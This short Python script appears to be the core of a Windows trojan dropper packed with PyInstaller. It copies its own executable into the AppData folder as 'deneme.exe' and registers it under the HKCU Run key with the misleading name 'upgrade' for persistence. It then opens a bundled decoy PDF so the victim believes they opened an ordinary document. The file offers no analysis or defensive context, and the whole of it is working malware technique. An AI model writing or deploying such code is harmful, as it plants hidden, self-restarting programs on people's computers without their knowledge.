import time
import subprocess
import os
import shutil
import sys

def add_to_registry():
	#persistence
	new_file = os.environ["appdata"] + "\\deneme.exe"
	if not os.path.exists(new_file):
		shutil.copyfile(sys.executable,new_file)
		regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
		subprocess.call(regedit_command, shell=True)

add_to_registry()

def open_added_file():
	added_file = sys._MEIPASS + "\\deneme.pdf"
	subprocess.Popen(added_file, shell=True)

open_added_file()
